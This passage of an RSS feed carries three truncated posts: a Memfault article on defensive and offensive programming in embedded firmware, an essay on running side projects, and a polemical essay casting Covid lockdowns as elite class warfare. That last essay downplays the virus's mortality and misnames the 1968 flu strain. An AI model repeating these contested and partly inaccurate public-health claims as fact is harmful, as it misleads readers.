order, at the wrong time, or with incorrect arguments. They could also be
because the system was in a bad state, such as out of memory or deadlocked.</p>

<p>The firmware <em>knows</em> there is an issue, and it likely knows <em>what the issue is</em>,
but yet it doesnâ€™t help solve the issue. The software was built with â€œDefensive
Programmingâ€ practices in mind, which allows for the firmware to keep running
even when incorrect behavior occurs.</p>

<p>Usually, I would prefer that the firmware crash, print a useful error, and guide
me exactly to where the issue is. This the guiding principle of â€œOffensive
Programmingâ€, which goes one step further than â€œDefensive Programmingâ€.</p>

<!-- excerpt start -->

<p>In this article, weâ€™ll dive into what defensive and offensive programming are,
where defensive programming falls short, how developers should think about using
them within embedded systems, and how the techniques of offensive programming
can surface bugs and help developers root cause them immediately at runtime.</p>

<!-- excerpt end -->

<p>By taking defensive and offensive programming to the extreme, youâ€™ll be able to
track down those 1 in 1,000-hour bugs, efficiently root cause them, and keep
your end-users happy. And, as a bonus, keep your sanity.</p>

<p>Like Interrupt? <a href="https://go.memfault.com/interrupt-subscribe" target="_blank">Subscribe</a> to get our latest posts straight to your mailbox.</p>



<h2 id="defensive-programming">Defensive Programming</h2>

<p>Defensive programming is the practice of writing software to enable continuous
operation after and while experiencing unplanned issues. A simple example is
checking for <code>NULL</code> after calling <code>malloc()</code>, and ensuring that the program
gracefully handles the case.</p>

<div><div><pre><code><span>void</span> <span>do_something</span><span>(</span><span>void</span><span>)</span> <span>{</span>
  <span>uint8_t</span> <span>*</span><span>buf</span> <span>=</span> <span>malloc</span><span>(</span><span>128</span><span>);</span>
  <span>if</span> <span>(</span><span>buf</span> <span>==</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>// handle this gracefully!</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Defensive programming sounds nice, and it is nice! The firmware that we write
should never catastrophically fail due to unforeseen circumstances if we donâ€™t
want it to.</p>

<p>Defensive programming really shines when interacting directly with hardware,
proprietary libraries, and external inputs that we donâ€™t have direct control
over. Hardware may have glitches or behave differently in various environments,
heavyweight libraries often are riddled with bugs, and the outside world will
send whatever it wants over communication protocols.</p>

<p>As with most things, defensive programming can be abused and the benefits become
outweighed by the negatives. If many modules are layered on top of one another,
each using defensive programming techniques, bugs can and will be created, lost,
and/or obscured.</p>

<h3 id="problems-with-defensive-programming">Problems with Defensive Programming</h3>

<p>The key to defensive programming is to use it at the exterior interfaces of your
firmware. There should be a thin but sturdy wall of defensive programming
between the outside world and hardware, and then the majority of your code
inside the walls should be more aggressively checking for errors and yelling at
developers when they do the wrong thing.</p>

<p>
  <img width="600" src="https://interrupt.memfault.com/blog/img/defensive-and-offensive-programming/internal-software.png" alt="internal-software">
  If code paths originate from or pass through the red zones, then defensive programming is a good approach.
</p>

<p>For instance, letâ€™s assume we have an internal function,
<code>hash32_djb2(const char *str, size_t len)</code>, which takes in the string we should
hash and a length. This function is <strong>never</strong> going to be directly used by any
external consumers, which leaves only internal developers.</p>

<p>By having a check and return value like the following:</p>

<div><div><pre><code><span>uint32_t</span> <span>hash32_djb2</span><span>(</span><span>const</span> <span>char</span> <span>*</span><span>str</span><span>,</span> <span>int</span> <span>len</span><span>)</span>
<span>{</span>
  <span>if</span> <span>(</span><span>str</span> <span>==</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>// Invalid argument</span>
    <span>return</span> <span>0</span><span>;</span>
  <span>}</span>
  <span>...</span>
</code></pre></div></div>

<p>You are only shooting yourself and your fellow developers in the feet. If any
developer passes a <code>NULL</code> string to this function, it will return <code>0</code> and be
stored as a valid hash!</p>

<p>The <code>NULL</code> string argument is likely the developerâ€™s own bug, and they should
immediately become aware of the bug, or else it might slip into production.</p>

<p>This practice of writing code to aggressively surface errors is what is known as
â€œOffensiveâ€ Programming.
(<a href="https://www.merriam-webster.com/dictionary/offensive" target="_blank">Merriam Webster definition #1</a>,
â€œmaking attackâ€)</p>

<h2 id="offensive-programming">Offensive Programming</h2>

<p>Offensive programming, although seemingly opposite in word choice, actually
expands upon defensive programming and takes it one step further. Instead of
just accepting that <code>malloc()</code> can fail, software with offensive programming in
mind might assert that <code>malloc()</code> <em>never</em> fails. If a <code>malloc()</code> call does fail,
the software fatally assert, print enough information for the developer to root
cause the issue or capture a core dump, and then reset it back to a known
working state.</p>

<p>In embedded systems, where the entire stack from hardware to software is often
built and controlled by a single organization, any bug is the responsibility of
the engineers in that organization to root cause and fix. Offensive programming
can be a useful approach to surface bugs that might otherwise take weeks to
reproduce or never be found.</p>

<p>Offensive programming can take many forms inside of software, but the most
common way is to use
<a href="https://interrupt.memfault.com/blog/asserts-in-embedded-systems">assertions</a> liberally
and creatively against developer errors and system state behavior.</p>

<p>Letâ€™s run through a few hypothetical situations and how you could use offensive
programming. If your embedded system is experiencing:</p>

<ul>
  <li>
<strong>Performance issues</strong> - such as the GUI freezing or slow response times to
button presses, you can use
<a href="https://interrupt.memfault.com/blog/firmware-watchdog-best-practices">watchdogs</a> or
timers and assertions to crash the system when the system stalls so that a
developer can figure out what exactly was consuming CPU time.</li>
  <li>
<strong>Memory issues</strong> - such as high stack usage, no free heap memory, or
excessive fragmentation, trigger a crash of the system when these states are
detected and capture the relevant parts for analysis by a developer to figure
out where the system went sideways. Itâ€™s rarely the final call to <code>malloc()</code>
or the highest function in the stack that pushes the system over the edge, but
everything that led up to it.</li>
  <li>
<strong>Locking issues</strong> - set a low-ish timeout (5 seconds) on RTOS functions, such
a <code>mutex_lock</code> and <code>queue_put</code>. Setting a low timeout will cause the system to
crash if the operation did not succeed in the allotted time, again allowing a
developer to further inspect what was the root issue. You can also choose to
spin indefinitely and have the watchdog <a href="https://interrupt.memfault.com/blog/firmware-watchdog-best-practices">clean
up</a>.</li>
</ul>

<p>This is just scratching the surface of offensive programming techniques, but I
hope you now have an idea of what this article is all about!</p>

<h3 id="benefits-of-offensive-programming">Benefits of Offensive Programming</h3>

<p>You might be asking why you should instrument your code and firmware with a
bunch of asserts, timers, watchdogs, and coordinated faults, and thatâ€™s a
reasonable question. Software crashes on an embedded system donâ€™t just take down
a thread, but often the entire system as well.</p>

<p>There are two sides to this double-edged sword.</p>

<p>On one hand, when the device experiences unforeseen issues, you can leave the
system running in an undefined and unpredictable state. Maybe the heap is out of
memory, or the system failed to put a critical event in a queue and weâ€™ve
dropped data, or maybe a thread has deadlocked and there is no automated
recovery mechanism. Some devices donâ€™t even have power buttons and need to be
manually unplugged or the batteries pulled out!</p>

<p>On the other hand, devices in an unintended state are essentially broken devices
and should be reset. If the device was out of heap, it likely isnâ€™t going to
recover and there exists a leak. If a thread has deadlocked, it also isnâ€™t going
to recover. Not to mention, running in an undefined state leaves firmware open
to security holes and is exactly what we want to avoid.</p>

<p>On top of preventing your firmware from running in an unpredictable state,
triggering asserts and faults at the exact moment of the bug helps developers
track down these issues! If your devices are connected to a debugger while an
assert or fault is hit, or you have core dump instrumentation, you can reap the
following benefits:</p>

<ul>
  <li>
<strong>Quicker bug fixes</strong> - If the system is halted or a core dump is captured
when an assert is hit, the developer can get access to backtraces, registers,
function arguments, and system state such as the heap, lists, and queues. With
all this information, developers can root cause issues more quickly.</li>
  <li>
<strong>Faster development</strong> - Writing a new piece of code that integrates into
multiple modules can be tricky if there are bugs or assumptions in the modules
you are integrating with. By having assertions and OffP practices in the
surrounding layers, if a developer does anything misaligned with the API
specs, the system will immediately alert the developer. Itâ€™s better than
tracking down what <code>-3</code> or <code>unknown_error</code> means and how it bubbled up through
the system.</li>
  <li>
<strong>Awareness of prevalence</strong> - Developers donâ€™t notice bugs unless they are
obvious or dropped in their inbox as a bug report. By forcing the software to
reset, awareness of these unknown bugs is increased and developers can more
easily understand how often they are occurring.</li>
  <li>
<strong>Returning system to sane state</strong> - If your comms thread is deadlocked, no
data will be sent from your device to the outside world, making your device a
brick until a user manually resets it. By resetting the device, you are more
likely to put the device back into a functioning state. Most embedded devices
have very quick reboot times, so it isnâ€™t a huge deal.</li>
</ul>

<h2 id="offensive-programming-in-practice">Offensive Programming in Practice</h2>

<p>Letâ€™s dig into some concrete examples of bugs we can find using offensive
programming practices.</p>

<h3 id="argument-validation">Argument Validation</h3>

<p>If a developer tries to use an API and passes invalid arguments into the</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interrupt.memfault.com/blog/defensive-and-offensive-programming">https://interrupt.memfault.com/blog/defensive-and-offensive-programming</a></em></p>]]>
            </description>
            <link>https://interrupt.memfault.com/blog/defensive-and-offensive-programming</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508896</guid>
            <pubDate>Tue, 22 Dec 2020 17:38:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I side project]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508810">thread link</a>) | @thesephist
<br/>
December 22, 2020 | https://thesephist.com/posts/how-i-side-project/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/how-i-side-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>This post started out as a long-form response to this tweet by Raj Kunkolienkar:</p>
<blockquote data-lang="en"><p lang="en" dir="ltr">Question to all the side project machines that I follow (with much respect) : what framework / setup / infrastructure / tools do you use to push out ideas to MVP so quickly?<a href="https://twitter.com/kognise?ref_src=twsrc%5Etfw">@kognise</a> <a href="https://twitter.com/thesephist?ref_src=twsrc%5Etfw">@thesephist</a> <a href="https://twitter.com/jajoosam?ref_src=twsrc%5Etfw">@jajoosam</a></p>â€” Raj Kunkolienkar ğŸš€ (@kunksed) <a href="https://twitter.com/kunksed/status/1130681972794175490?ref_src=twsrc%5Etfw">May 21, 2019</a></blockquote>

<p>â€¦ but then, I got busy, a few weeks passed, and it took a while for me to get back to it. On the upside, I have a new place for my ramblings now, which is <a href="https://dotink.co/">dotink.co</a>. Itâ€™s meant to be a more technical blog for when I want to talk more about software and design, but weâ€™ll see how things go.</p>
<h2 id="side-projects">Side projects</h2>
<p>Over the last year, it seems like Iâ€™ve developed a habit of working on and releasing a large number of side projects, from the mundane (like <a href="https://thesephist.github.io/blocks.css/">the blocks.css library</a>) to the interesting (like <a href="https://soundsfromplaces.surge.sh/">Sounds from Places</a>) to the technical (like <a href="https://github.com/thesephist/ink">making a new programming language</a>). Everybodyâ€™s process and working style is different, but I thought it may be interesting to share how I think about side projects, and go from question to idea to execution to promotion.</p>
<p>For me, a side project is always some mixture of learning something new, fixing some problem I have in my life, or making something that I wish existed in the world, but doesnâ€™t. I usually first get the idea for a project from needing to scratch some itch in my life or from an idea someone tosses out, but I let it simmer on my to-do list for a while before deciding that itâ€™s worth spending some time on it to make it real.</p>
<h3 id="ideas">Ideas</h3>
<p>If I ventured a guess, Iâ€™d say I only attempt to build about 20% of the project ideas I write down, and end up working on only about half of that 20% to completion. So in total, given that I donâ€™t always write down all of the ideas I have, less than one in ten ideas I have ever become useful side projects. Some are left on the cutting room floor because I donâ€™t have time, and others are abandoned because I just end up without the time to finish them once I start.</p>
<p>Here are some ideas I currently have on my to-doâ€™s, but may not get to for some time.</p>
<ul>
<li>â€œFreeBusyâ€, a web app that allows people to find a time thatâ€™s open on my calendar and suggest or schedule a meeting time quickly without email back-and-forths.</li>
<li><code>goodfirstissue.org</code>, a website with guides and interactive tools to help first-time open-source contributors find easy, low-barrier ways to get involved in open source software using GitHubâ€™s APIs.</li>
<li>A â€œshopping cart for nonprofitsâ€. I think thereâ€™s something psychologically satisfying about collecting items into a metaphorical shopping cart and â€œchecking outâ€. It may be interesting if we can redesign the experience of giving to nonprofits to be more like online shopping, and less like finding your way around a 10-year-old website for an online bank that hasnâ€™t had a developer on staff for a year.</li>
<li>â€œGesturalâ€, a JavaScript library for making multi-touch gesture recognition easy on the web. This was inspired by my positive experience building <a href="https://linus.zone/av">Animated Value</a>, a small library for physics-based web animations.</li>
<li>A new version of my personal / internal dashboard for keeping track of the health of my servers / apps I run. I have an older implementation called Callisto, but itâ€™s starting to show its age.</li>
<li>â€œRenâ€, a code editor that edits at the level of the abstract syntax tree, not the text content of the program. Check out <a href="https://www.facebook.com/notes/kent-beck/prune-a-code-editor-that-is-not-a-text-editor/1012061842160013/">this earlier experiment</a> by another engineer for a taste of what it might become.</li>
<li>A read-it-later service. I currently use Pocket, but have some complaints and shortcomings that Iâ€™d like to address with a homebrew solution.</li>
<li>â€œNocturneâ€, a Dropbox replacement. I love Dropbox for its core features, but their consumer offering has been bloating at intergalactic speeds recently.</li>
</ul>
<p>(If any of these ideas strike your fancy, feel free to start a conversation with me or go implement it yourself! I donâ€™t own these ideas.)</p>
<p>Soâ€¦ Iâ€™ve got a lot simmering on my mind. Youâ€™ll notice that most of these are intended to just solve some minor problem or complaint I have with my current workflow. Some of these ideas are more fueled by personal curiosity, or thinking â€œwouldnâ€™t it be really cool if this existed?â€ The shopping-cart-for-nonprofits is one such idea, and an earlier project called <a href="https://soundsfromplaces.surge.sh/">Sounds from Places</a> is another like it.</p>
<p>This part â€“ getting ideas â€“ feels like the hardest part of my side project puzzle to describe, because I donâ€™t really ever sit down and think, â€œOkay, what should I built next?â€ I try to remember and write down ideas when they come up in conversation or in the shower, and remember to check back on that list whenever I have some free cycles in my life.</p>
<h3 id="naming">Naming</h3>
<p>Definitively the most important part of my workflow!</p>
<p>Jokes aside, names do mean a lot to me. At the beginning of a project, I donâ€™t really know what its public name is going to be at the end, so I usually end up giving the project some codename that I can use to identify it, until I settle on a good launch name. For example, <a href="https://getstudybuddy.com/">Studybuddy</a> was codenamed â€œgeminiâ€, <a href="https://zerotocode.org/">Zero to Code</a> was codenamed â€œTridentâ€, and my upcoming personal to-do app is codenamed â€œsigilâ€.</p>
<p>And obviously, some codenames stick around post-launch, like <a href="https://github.com/thesephist/torus">Torus</a> and <a href="https://github.com/thesephist/ink">Ink</a>. Some names are also decided from the get-go. <a href="https://beta.codeframe.co/">Codeframe</a>, <a href="https://github.com/thesephist/looking-glass">Looking Glass</a>, and <a href="https://github.com/thesephist/blocks.css">blocks.css</a> were all named from the beginning.</p>
<p>I try to give projects names that reflect something about the idea, but are relatively unique and sound good to my ear. I get a lot of inspiration from foreign languages, some from thesauruses and archaic names for people and places, and occasionally, made-up words.</p>
<h3 id="start-when-the-motivations-high">Start when the motivationâ€™s high</h3>
<p>The number-one advice I have when people ask me how to productively work on side projects is this â€“ <strong>when you first have the idea, you have more motivation to work on the project than you will for a while, so start immediately.</strong></p>
<p>This isnâ€™t always practical, and sometimes life just gets in the way. But I find that when I have an idea and immediately get down and dirty prototyping within a few hours, I can always crank out a working prototype that looks usable within the same day. Codeframe, Studybuddy, Zero to Code, Looking Glass, blocks.css, and <a href="https://genius.com/a/a-teen-programmer-built-a-tool-called-lyrics-rip-to-generate-fake-lyrics-for-your-favorite-artists">Lyrics.rip</a> were all mostly built the same day I had the idea and got down to it right then.</p>
<p>There are counterexamples â€“ Torus took about 3 weeks with a 5-month hiatus in between, <a href="https://github.com/thesephist/ink">Ink</a> has been about two months in the making with a month hiatus in between, and Sounds from Places languished on my computer untouched for so long that when I got back to it, I scrapped everything and started over.</p>
<p>But on balance, I find that whenever I get a chance to start on a project the same day I have the idea, Iâ€™m the most energized and excited about the idea, and able to get the most done and stay focused easily. When I manage to do this, I almost always get to a presentable prototype in 6-8 hours. Most of what you see on my Facebook and Twitter are prototypes after this 6-8 hour initial sprint, and sometimes itâ€™s in a good enough shape that I donâ€™t really feel the need to touch it after that, like <a href="https://calhacks.org/">Calhacks.org</a>.</p>
<h3 id="picking-out-obstacles-from-my-workflow">Picking out obstacles from my workflow</h3>
<p>After getting started immediately, the next trick that has helped me become the most productive in the last year has been to consciously remove obstacles from my side project workflow. <em>What kind of obstacles?</em>, you might ask. Hereâ€™s a non-comprehensive list of things that I may have spent hours doing last year, that are now trivial or take just a few minutes.</p>
<ul>
<li>It used to take me hours to get everything set up to deploy a project, from getting a domain to setting up DNS, finding a server, getting all the configurations right, and so on. These days, depending on the kind of project, I can deploy it within seconds or minutes of it being done. I donâ€™t need to think about it these days, and itâ€™s mostly due to repetition and practice that Iâ€™ve gotten to this point. I use <a href="https://surge.sh/">Surge.sh</a> for static deploys, (Zeit Now)(<a href="https://zeit.co/">https://zeit.co</a>) for serverless deployments, and my custom server infrastructure on <a href="https://digitalocean.com/">DigitalOcean</a> for more heavyweight apps and services.</li>
<li>Having built a variety of apps, I now have some template or framework that I can copy from a previous project when I start almost anything new. I use <a href="https://github.com/thesephist/torus">Torus</a>, my frontend framework, for all my web projects, and I have a template I copy for my backend projects and static sites. I have a lightweight slap-on CSS library for making things look good with low effort with blocks.css, and these templates and copy-paste snippets make getting started super quick, even with fairly involved projects. I was only able to release <a href="https://github.com/calhacks/recruitbot">RecruitBot</a> in 6 hours because I could lean on both my frontend framework and a backend I copy-pasted from Studybuddy, and because I could easily deploy it on a server I had available for my projects. This might not be the most glamorous approach to starting new projects, but it gets me up and running quickly with a new idea, and that matters more than anything at the start. Having these battle-tested tools that Iâ€™ve used over and over again within easy reach has been the single most helpful thing in being able to push out MVPs and prototypes quickly.</li>
<li>Use a consistent set of small tools, and know it well. Some people use side projects to learn a galaxy of different tools and frameworks and libraries, which is great for them. But I donâ€™t really work that way, and Iâ€™ve come to use a really small set of tools and libraries for all of my projects. As a benefit of using a consistent set of tools, Iâ€™ve come to know all the tools I use <em>very well</em>. If anything goes wrong, chances are, Iâ€™ve probably seen and solved the problem before, and I can probably fix it with a single Google search at most. Besides the ones mentioned above, these tool are Vim and Tmux for text editing and working in the command line, Chrome Developer Tools for web development, telnet, curl, dig, and whois for troubleshooting network issues, and Adobe XD for UI prototyping and design, when I need it.
<ul>
<li>This is also one of the reasons I enjoy working â€¦</li></ul></li></ul></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thesephist.com/posts/how-i-side-project/">https://thesephist.com/posts/how-i-side-project/</a></em></p>]]>
            </description>
            <link>https://thesephist.com/posts/how-i-side-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508810</guid>
            <pubDate>Tue, 22 Dec 2020 17:32:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Great Covid Class War]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508370">thread link</a>) | @AndrewBissell
<br/>
December 22, 2020 | https://www.thebellows.org/the-great-covid-class-war/ | <a href="https://web.archive.org/web/*/https://www.thebellows.org/the-great-covid-class-war/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<amp-auto-ads type="adsense" data-ad-client="ca-pub-8554251701278654" i-amphtml-layout="container"></amp-auto-ads> 
<p>On January 19, 2020, Washington state reported the first US case of coronavirus. By the end of March, <a href="https://www.bbc.com/news/world-us-canada-52103066" target="_blank" rel="noreferrer noopener">245 million Americans</a> were under stay-at-home restrictions to â€œ<a href="https://www.washingtonpost.com/graphics/2020/world/corona-simulator/" target="_blank" rel="noreferrer noopener">flatten the curve</a>.â€ Mainstream news terrorized the public with <a href="https://www.nytimes.com/2020/03/13/science/coronavirus-math-mitigation-distancing.html" target="_blank" rel="noreferrer noopener">exponential</a> graphs, threats of a medical supply <a href="https://www.medtechdive.com/news/hhs-officials-warn-of-medical-supply-shortages-amid-coronavirus-outbreak/573011/" target="_blank" rel="noreferrer noopener">shortage</a>, and displays of <a href="https://www.youtube.com/watch?v=TnLCYqk20YU" target="_blank" rel="noreferrer noopener">hygiene theater</a>. Appeals to science were weaponized to enforce conformity, and the media portrayed anti-lockdown protesters as <a href="https://www.thenation.com/article/politics/lockdown-protest-media/" target="_blank" rel="noreferrer noopener">backwards</a>, <a href="https://www.nytimes.com/2020/04/21/us/politics/coronavirus-protests-trump.html" target="_blank" rel="noreferrer noopener">astroturfed</a> <a href="https://www.wired.com/story/anti-lockdown-protests-online/" target="_blank" rel="noreferrer noopener">white nationalists</a> bent on endangering the public.&nbsp;</p>



<p>Today millions of Americans have <a href="https://www.nytimes.com/2020/10/15/us/politics/federal-aid-poverty-levels.html" target="_blank" rel="noreferrer noopener">fallen into poverty</a> or are on the verge of destitution. Stimulus money has largely been used as a <a href="https://www.propublica.org/article/how-the-coronavirus-bailout-repeats-2008s-mistakes-huge-corporate-payoffs-with-little-accountability" target="_blank" rel="noreferrer noopener">handout to corporations</a>, and over <a href="https://www.forbes.com/sites/christiankreznar/2020/09/16/small-businesses-are-closing-at-a-rapid-pace-with-restaurants-and-retailers-on-the-west-coast-among-the-hardest-hit/?sh=4542ee185033" target="_blank" rel="noreferrer noopener">160,000 small businesses</a> have closed. In March and April <a href="https://www.cnn.com/2020/04/30/economy/unemployment-benefits-coronavirus/index.html" target="_blank" rel="noreferrer noopener">30 million Americans</a> filed for unemployment. Now temporary job losses are <a href="https://www.cnbc.com/2020/10/13/covid-related-unemployment-is-now-permanent-for-almost-4-million.html" target="_blank" rel="noreferrer noopener">becoming permanent</a>. 12 million unemployed people may see their <a href="https://www.politico.com/news/2020/12/11/coronavirus-relief-unemployment-444645" target="_blank" rel="noreferrer noopener">benefits lapse</a> even if Congress passes a new aid deal. Homelessness is <a href="https://www.cbsnews.com/news/covid-19-homelessness-new-york-city/" target="_blank" rel="noreferrer noopener">spiking</a>, 11.4 million households owe <a href="https://www.bloomberg.com/news/articles/2020-12-10/u-s-households-may-be-70-billion-behind-on-rent" target="_blank" rel="noreferrer noopener">$70 billion</a> in back rent and fees, and <a href="https://www.cnn.com/2020/08/07/economy/eviction-stimulus/index.html" target="_blank" rel="noreferrer noopener">40 million</a> people are at risk of eviction. In some states, food bank lines stretch for <a href="https://thehill.com/policy/finance/527462-long-lines-form-at-food-banks-across-country-ahead-of-thanksgiving" target="_blank" rel="noreferrer noopener">miles</a>, and <a href="https://www.feedingamerica.org/sites/default/files/2020-05/Brief_Local%20Impact_5.19.2020.pdf" target="_blank" rel="noreferrer noopener">1 in 4 children</a> are expected to experience food insecurity.&nbsp;</p>



<p>Meanwhile, Walmart and Target <a href="https://www.nytimes.com/2020/08/19/business/coronavirus-walmart-target-home-depot.html" target="_blank" rel="noreferrer noopener">reported record sales</a>. Amazon <a href="https://www.theguardian.com/technology/2020/oct/29/amazon-profits-latest-earnings-report-third-quarter-pandemic" target="_blank" rel="noreferrer noopener">tripled</a> its profits and Jeff Bezos made <a href="https://www.msn.com/en-us/money/companies/jeff-bezos-has-gotten-70-billion-richer-in-the-past-12-months-here-are-11-mind-blowing-facts-that-show-just-how-wealthy-the-amazon-ceo-really-is/ss-BB194gAv?ocid=msedgntp" target="_blank" rel="noreferrer noopener">$70 billion</a>. Billionaires have collectively made over <a href="https://www.forbes.com/sites/niallmccarthy/2020/11/27/us-billionaires-added-1-trillion-to-their-collective-wealth-since-the-start-of-the-pandemic-infographic/?sh=3d09d39366ce" target="_blank" rel="noreferrer noopener">$1 trillion</a> since March. Alphabet, Amazon, Apple, Facebook, and Microsoft now make up <a href="https://www.nytimes.com/2020/08/19/technology/big-tech-business-domination.html" target="_blank" rel="noreferrer noopener">20% of the stock market</a>â€™s total worth. The tech industry has achieved an unparalleled level of wealth and dominance. Data, which has been <a href="https://www.economist.com/leaders/2017/05/06/the-worlds-most-valuable-resource-is-no-longer-oil-but-data" target="_blank" rel="noreferrer noopener">more valuable than oil</a> since 2017, is expected to expand its <a href="https://www.wsj.com/articles/why-the-u-s-economy-will-take-off-in-2021-11607612401" target="_blank" rel="noreferrer noopener">economic footprint</a>.</p>



<div id="block_5fda90a336c0f">
    <p>
		â€œThis is not an unforced error or a good policy idea implemented poorly. It is an economic agenda disguised as a health protocol.â€    </p>
</div>


<p>Unemployment, hunger, institutional breakdown, and the destruction of social bonds are not symptoms of a virus. They are the indirect violence of class warfare. The pandemic is a convenient scapegoat for the largest upward wealth transfer in modern human history. Under the pretext of a public health policy, elites have successfully waged a counterrevolution that will result in the erosion of working conditions and quality of life for generations to come.&nbsp;</p>



<h5><strong>A Self-Fulfilling Prophecy</strong></h5>



<p>Death, disease, and pandemics have always been part of human life and they always will be. <a href="https://www.cdc.gov/nchs/fastats/deaths.htm" target="_blank" rel="noreferrer noopener">2.8 million</a> Americans die every year and <a href="https://ourworldindata.org/causes-of-death" target="_blank" rel="noreferrer noopener">56 million</a> people die worldwide. Each year <a href="https://www.who.int/data/gho/data/themes/tuberculosis" target="_blank" rel="noreferrer noopener">1.3 million</a> people die of tuberculosis, <a href="https://www.unicef.org/press-releases/ten-things-you-didnt-know-about-malaria#:~:text=Almost%20half%20the%20world's%20population,global%20malaria%20control%20is%20slipping." target="_blank" rel="noreferrer noopener">445,000</a> die of malaria, and <a href="https://www.health.com/condition/cold-flu-sinus/how-many-people-die-of-the-flu-every-year" target="_blank" rel="noreferrer noopener">290,000-650,000</a> die of influenza. In 1968 <a href="https://www.britannica.com/event/1968-flu-pandemic" target="_blank" rel="noreferrer noopener">1-4 million</a> people died in the H2N3 influenza pandemic, during which businesses and schools <a href="https://nypost.com/2020/05/16/why-life-went-on-as-normal-during-the-killer-pandemic-of-1969/" target="_blank" rel="noreferrer noopener">stayed open</a> and large events were held.&nbsp;</p>



<p>Indefinite closures have never before been used as a disease control method on a global scale. These experimental restrictions were shaped by the <a href="https://www.theguardian.com/science/2020/mar/25/coronavirus-exposes-the-problems-and-pitfalls-of-modelling" target="_blank" rel="noreferrer noopener">discredited</a> <a href="https://www.imperial.ac.uk/news/196234/covid-19-imperial-researchers-model-likely-impact/" target="_blank" rel="noreferrer noopener">Imperial College Model</a> which <a href="https://www.nytimes.com/2020/03/17/world/europe/coronavirus-imperial-college-johnson.html" target="_blank" rel="noreferrer noopener">predicted</a> 2.2 million US deaths. Many <a href="https://www.wsj.com/articles/is-the-coronavirus-as-deadly-as-they-say-11585088464" target="_blank" rel="noreferrer noopener">epidemiologists</a> and <a href="https://www.nytimes.com/2020/03/20/opinion/coronavirus-pandemic-social-distancing.html" target="_blank" rel="noreferrer noopener">doctors</a> questioned these doomsday projections and pointed out that there was <a href="https://www.statnews.com/2020/03/17/a-fiasco-in-the-making-as-the-coronavirus-pandemic-takes-hold-we-are-making-decisions-without-reliable-data/" target="_blank" rel="noreferrer noopener">not sufficient data</a> to justify lockdowns. The virus has a <a href="https://www.cdc.gov/coronavirus/2019-ncov/hcp/planning-scenarios.html" target="_blank" rel="noreferrer noopener">low</a> mortality rate, especially for people <a href="https://www.sciencedirect.com/science/article/pii/S0013935120307854" target="_blank" rel="noreferrer noopener">under 65</a>, and <a href="https://www.kark.com/news/new-cdc-report-shows-94-of-covid-19-deaths-in-us-had-underlying-medical-conditions/" target="_blank" rel="noreferrer noopener">94%</a> of US covid deaths have occurred with comorbidities. Most <a href="https://www.wsj.com/articles/the-failed-experiment-of-covid-lockdowns-11599000890" target="_blank" rel="noreferrer noopener">statistical analysis</a> does <a href="https://www.frontiersin.org/articles/10.3389/fpubh.2020.604339/full#SM6" target="_blank" rel="noreferrer noopener">not show</a> lockdown measures to be an effective strategy for <a href="https://www.thelancet.com/journals/eclinm/article/PIIS2589-5370(20)30208-X/fulltext" target="_blank" rel="noreferrer noopener">reducing mortality</a>.</p>



<p>In March unprecedented policies were rationalized through shocking <a href="https://www.theguardian.com/world/2020/mar/13/italian-doctor-an-experience-i-would-compare-to-a-world-war" target="_blank" rel="noreferrer noopener">stories</a> and <a href="https://www.youtube.com/watch?v=_J60fQr0GWo" target="_blank" rel="noreferrer noopener">videos</a> from northern Italy. The regionâ€™s crowded ICUs were presented as a warning for the rest of Europe and the US. Unknown to many was the fact that Lombardy had been severely impacted by <a href="https://www.nytimes.com/2020/11/19/business/lombardy-italy-coronavirus-doctors.html" target="_blank" rel="noreferrer noopener">ongoing privatization efforts</a> and a <a href="https://www.statista.com/statistics/557042/hospitals-in-italy/" target="_blank" rel="noreferrer noopener">shrinking hospital system</a> regularly overwhelmed by <a href="https://www.sciencedirect.com/science/article/pii/S1201971219303285" target="_blank" rel="noreferrer noopener">influenza</a>. This omission by mainstream media played a key role in developing the mythology that economic shutdown could magically eradicate a virus. In reality lockdowns have accelerated a cycle of austerity and created a self-fulfilling prophecy of perpetual crisis.&nbsp;</p>



<p>Chronic <a href="https://www.cbsnews.com/news/nursing-home-deaths-coronavirus-understaffing/" target="_blank" rel="noreferrer noopener">understaffing</a> and <a href="https://www.nytimes.com/2020/10/29/nyregion/nursing-home-workers-pandemic-jobs.html" target="_blank" rel="noreferrer noopener">lockdown-induced layoffs</a> in nursing homes severely exacerbated covidâ€™s death toll. 40% of US covid deaths are <a href="https://www.forbes.com/sites/jemimamcevoy/2020/06/16/nursing-homes-account-for-over-40-of-us-coronavirus-deaths/?sh=54afb581300b" target="_blank" rel="noreferrer noopener">linked to nursing homes</a>. 1 in 6 covid deaths in Vermont were <a href="https://theintercept.com/2020/12/02/vermont-nursing-home-covid-genesis/" target="_blank" rel="noreferrer noopener">from a single facility</a>. In New York (the state with the <a href="https://www.statista.com/statistics/1109011/coronavirus-covid19-death-rates-us-by-state/" target="_blank" rel="noreferrer noopener">second highest</a> covid deaths per million) hospitals sent over 6,300 elderly covid patients <a href="https://www.nbcnewyork.com/news/coronavirus/new-york-hospitals-sent-6300-recovering-covid-patients-to-nursing-homes/2502812/" target="_blank" rel="noreferrer noopener">back into nursing homes</a>. Unprotected, underserved, and alone, the elderly are also afflicted by the â€œ<a href="https://www.nytimes.com/2020/10/30/us/nursing-homes-isolation-virus.html" target="_blank" rel="noreferrer noopener">slow killer</a>â€ of loneliness. Isolation increases risk of <a href="https://www.health.harvard.edu/mind-and-mood/loneliness-and-isolation-raise-risk-for-stroke-and-heart-disease-study-suggests" target="_blank" rel="noreferrer noopener">heart disease, stroke</a>, and <a href="https://www.alzinfo.org/articles/feeling-lonely-increases-alzheimers-risk-2/" target="_blank" rel="noreferrer 